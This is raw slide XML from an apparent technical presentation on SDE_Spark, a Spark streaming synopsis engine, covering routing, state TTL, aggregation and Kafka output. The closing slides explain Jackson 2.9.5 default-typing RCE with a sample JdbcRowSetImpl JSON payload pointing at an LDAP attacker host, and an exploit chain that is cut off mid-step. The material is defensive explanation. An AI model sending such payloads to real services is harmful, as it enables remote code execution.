            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │                             │             Jackson 2.9.5              │    Jackson 2.15+     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────────┼────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Polymorphic RCE             │ Vulnerable (if Default Typing enabled) │ Fixed via allow-list │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────────┼────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> direct risk       │ Low (typed deserialization only)       │ None                 │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────────┼────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Compliance scanners         │ Flags as Critical                      │ Clean                │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├─────────────────────────────┼────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Recommended for new project │ No                                     │ Yes                  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └─────────────────────────────┴────────────────────────────────────────┴──────────────────────┘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19E3-A8BB-4855-ABBB-FACD74A108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35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Layer 2 - Routing &amp; Registration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Purpose:  Distribute incoming data points and requests to the correct synopsis partitions.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Technical Implementation (Spark)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>DataRouter is a single flatMapGroupsWithState operator that handles BOTH request fan-out and data fan-out. This is critical because:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- ADD requests register parallelism in the routing state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Data events use that routing state to determine which keyed partitions to route to</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>- Both must be in the same groupByKey partition to share state</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>For noOfP=1: requests and data pass through unchanged.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>For noOfP&gt;1:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  - ADD requests register parallelism and get fanned out to Forex_2_KEYED_0, Forex_2_KEYED_1, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  - Data events get hashed by streamID and routed to the appropriate keyed partition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  - ESTIMATE/DELETE requests also get fanned out to all keyed partitions</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>RequestRouter class still exists but is no longer used in the main pipeline. DataRouter subsumes its functionality.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Event ordering within micro-batches: DataRouter sorts events (ADDs first, then DATA, then ESTIMATE/DELETE) to ensure routing registrations are applied before data needs to be routed.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19E3-A8BB-4855-ABBB-FACD74A108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03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Layer 3 - Synopsis Processing  (Core Layer)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Purpose:  Maintain the lifecycle of all synopsis instances -- creation, data ingestion, query answering, and deletion -- keyed per synopsis partition.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Technical Implementation (Spark)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>SynopsisProcessor is implemented as a flatMapGroupsWithState keyed on partitionKey. Each key maps to a SynopsisProcessorState object stored in-memory (HashMap). Dispatches on InputEvent type:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>DATA event        -&gt; iterate all active synopses for this key, call synopsis.add(datapoint)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>REQUEST(ADD)      -&gt; SynopsisFactory.create(synopsisID, params), store in state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>REQUEST(ESTIMATE) -&gt; call synopsis.estimate(), emit Estimation result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>REQUEST(DELETE)   -&gt; remove synopsis from state map</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>SynopsisFactory -- synopsis IDs in SDE_Spark:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>case 1 -&gt; new CountMin(uid, params)             // Frequency estimation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>case 2 -&gt; new Bloomfilter(uid, params)          // Set membership</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>case 3 -&gt; new AMSsynopsis(uid, params)          // Second-moment estimation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>case 4 -&gt; new HyperLogLogSynopsis(uid, params)  // Cardinality estimation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>State Management &amp; Persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>All Synopsis classes implement java.io.Serializable -- a project invariant enforced from the first line of code. State is stored in a Java HashMap in executor memory on every micro-batch. Spark takes incremental snapshots to HDFS/S3. On restart, state is rehydrated from the checkpoint before processing resumes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>State Timeout (TTL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Each ADD request may include an optional ttl field (e.g., "24h", "7d")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Timeout resets after every event that touches the key (activity-based)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Global safety-net of 7 days for synopses without an explicit TTL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>On timeout: eviction notice (requestID = -1) emitted to output topic before state.remove()</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>TTL stands for Time To Live. It is a timer attached to a piece of data that answers one question:</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>  "If nobody has touched this in X amount of time — should we delete it?“</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Without TTL, this state accumulates forever. Consider these real scenarios:</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>  Scenario 1 — Client crashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  Client creates a HyperLogLog, starts sending data,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  then crashes before sending DELETE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → Without TTL: state lives in in-memory state store forever</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → With TTL:    state evicted after 7 days of inactivity</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>  Scenario 2 — Developer testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  Developer creates 50 test synopses during development,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  never cleans them up.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → Without TTL: 50 dead entries consuming memory permanently</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → With TTL:    all evicted automatically</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>  Scenario 3 — Long-running production system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  Over months, thousands of synopses are created and forgotten.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → Without TTL: in-memory state store grows unboundedly → disk full → system crash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  → With TTL:    only active synopses remain</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Bottom line</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>  ┌──────────────────────────┬────────────────────────────┬────────────────────────────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  │                          │        Without TTL         │                  With TTL                  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  ├──────────────────────────┼────────────────────────────┼────────────────────────────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  │ Client forgets to DELETE │ State lives forever        │ Evicted after 7 days                       │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  ├──────────────────────────┼────────────────────────────┼────────────────────────────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  │ in-memory state store size over time   │ Grows unboundedly          │ Bounded by active synopses only            │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  ├──────────────────────────┼────────────────────────────┼────────────────────────────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  │ System stability         │ Disk full risk over months │ Self-healing                               │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  ├──────────────────────────┼────────────────────────────┼────────────────────────────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  │ Client notification      │ None                       │ Eviction notice via Kafka (requestID = -1) │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>  └──────────────────────────┴────────────────────────────┴────────────────────────────────────────────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19E3-A8BB-4855-ABBB-FACD74A108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34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keeps all synopsis state in a Java HashMap in RAM. Every micro-batch, it reads/writes state directly from</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  memory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Micro-batch arrives → read state from RAM → process → write state back to RAM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                            ↓</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                periodically snapshot to HDFS/S3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                (for crash recovery)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Fast: direct memory access, no serialization during normal processing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Limit: all state must fit in executor memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Crash recovery: restores from the last HDFS/S3 checkpoint (may lose a few seconds of data)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RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (available as upgrade)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  State is stored in an embedded key-value database on local SSD. Every micro-batch, Spark serializes/deserializes state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   to/from disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Micro-batch arrives → deserialize state from SSD → process → serialize state back to SSD</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                                      ↓</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                                                          periodically snapshot to HDFS/S3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Slower: every state access involves disk I/O + serialization overhead</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - No memory limit: state can be terabytes (limited by disk, not RAM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Same crash recovery: also uses HDFS/S3 checkpoints</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  When to switch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌────────────────────────────────────────────────┬──────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │                    Scenario                    │         Use          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Hundreds of synopses, moderate data            │ In-memory (our case) │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Thousands of synopses, large accumulated state │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────────────────────────────┼──────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Memory-constrained environments                │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └────────────────────────────────────────────────┴──────────────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The switch is a single config line — no code changes needed. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>We start simple and upgrade only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19E3-A8BB-4855-ABBB-FACD74A108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42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4 - Path Splitting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 each Estimation result to the correct output path based on whether it needs to be merged with partial results from other partitions.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 filter() on the stream of Estimation objects, branching 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noOfP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noOfP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== 1  -&gt;  GREEN PATH  (direct output, no merging needed)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noOfP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&gt; 1  -&gt;  PURPLE PATH (partial result, send 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ReduceAggregator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filter() calls on Dataset&lt;Estimation&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/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5 - Aggregation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 all partial Estimation results for a given request and merge them into a single final result using a type-specific merge function.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ReduceAggregator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implemented as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flatMapGroupsWithState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keyed on request UID. Accumulates partial Estimation objects until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noOfP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partials arrive, then applies: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CountMin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-&gt;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SimpleSumFunction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(element-wise matrix addition)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BloomFilter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-&gt;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SimpleORFunction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(bitwise OR of bit arrays)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(AMS)         -&gt;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SimpleSumFunction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(element-wise sum)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synopsisID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HyperLogLog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-&gt;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SimpleSumFunction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(register-wise merge)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groupByKey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distributes merge work across the cluster -- each unique request UID is processed on an independent executor.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UID stands for Unique Identifier. In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> specifically, it is the key used by the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ReduceAggregator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Layer 5) to group</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  together all partial estimation results that belong to the same original query — so they can be merged into one final answer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The problem it solves</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  When a client creates a synopsis with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>noOfP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 4 (4 parallel partitions), a single ESTIMATE request gets copied into 4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  separate partition queries by the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RequestRouter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  Client sends one ESTIMATE request  (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>requestID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 1001)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RequestRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> copies it:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      ┌─────────┼─────────┬─────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      ▼         ▼         ▼         ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   key_0      key_1     key_2     key_3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      │         │         │         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      ▼         ▼         ▼         ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  partial_0  partial_1  partial_2  partial_3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Now Layer 5 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ReduceAggregator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) receives 4 separate Estimation objects on the stream. It needs to know:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  "These 4 partials all came from the same original request — group them together and merge them."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  That grouping key is the UID.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19E3-A8BB-4855-ABBB-FACD74A108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03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6 - Output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Serialize final Estimation results back to JSON and publish to the Kafka output topic.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Implementation (Spark)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writeStream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.format("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.option("topic", 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estimation_topic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.trigger(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Trigger.ProcessingTime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("1 second"))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.option("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checkpointLocation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hdfsPath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.start()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the GREEN path (direct) and PURPLE path (post-merge) feed into this single output layer. The JSON schema of the Estimation message is byte-for-byte identical to the SDE/Flink output (same field names, same types).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19E3-A8BB-4855-ABBB-FACD74A108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47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vulnerabilities — same root cause</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Both Jackson's CVE and SDE/Flink's case 25 exploit the same fundamental mistake:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Taking a class name from untrusted external input and instantiating it via Java reflection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Understanding one means understanding both.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Part 1 — How Jackson 2.9.5 RCE works</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The root cause: Default Typing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  When </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>enableDefaultTyping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() is active, Jackson embeds and reads Java class names directly from JSON:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dataSetKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>": "Forex",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    "type": ["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>com.sun.rowset.JdbcRowSetImpl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>", {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dataSourceName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>": "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ldap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>://attacker.com/exploit",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>autoCommit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>": true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    }]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Jackson reads the class name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>com.sun.rowset.JdbcRowSetImpl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, finds it on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>classpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and instantiates it — calling its</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  setters with the attacker-controlled values in the process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The exploit chain — step by step</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  1. Attacker crafts malicious JSON payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     (class name + constructor/setter arguments embedded)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  2. Payload arrives on Kafka </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>data_topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>request_topic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>           ▼</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  3. Layer 1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ObjectMapper.readValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
